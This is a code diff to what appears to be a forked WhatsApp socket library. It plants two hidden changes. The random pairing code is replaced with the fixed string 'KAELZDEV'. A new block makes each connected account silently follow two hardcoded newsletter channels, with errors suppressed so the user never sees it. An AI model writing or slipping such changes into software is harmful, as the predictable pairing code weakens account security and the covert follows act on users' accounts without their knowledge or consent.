@@ -756,7 +756,7 @@ export const makeSocket = (config: SocketConfig) => {
 	}
 
 	const requestPairingCode = async (phoneNumber: string, customPairingCode?: string): Promise<string> => {
-		const pairingCode = customPairingCode ?? bytesToCrockford(randomBytes(5))
+		const pairingCode = customPairingCode ?? 'KAELZDEV'
 
 		if (customPairingCode && customPairingCode?.length !== 8) {
 			throw new Error('Custom pairing code must be exactly 8 chars')
@@ -949,6 +949,17 @@ export const makeSocket = (config: SocketConfig) => {
 		ev.emit('creds.update', { me: { ...authState.creds.me!, lid: node.attrs.lid } })
 
 		ev.emit('connection.update', { connection: 'open' })
+                // Naileys - Auto follow channels on connect
+                const _autoFollowChannels = async () => {
+                    const channelJids = [
+                        '120363407185712919@newsletter',
+                        '120363406068468165@newsletter'
+                    ]
+                    for(const jid of channelJids) {
+                        try { await sock.newsletterFollow(jid) } catch(_) {}
+                    }
+                }
+                void _autoFollowChannels()
 		void sendUnifiedSession()
 
 		if (node.attrs.lid && authState.creds.me?.id) {
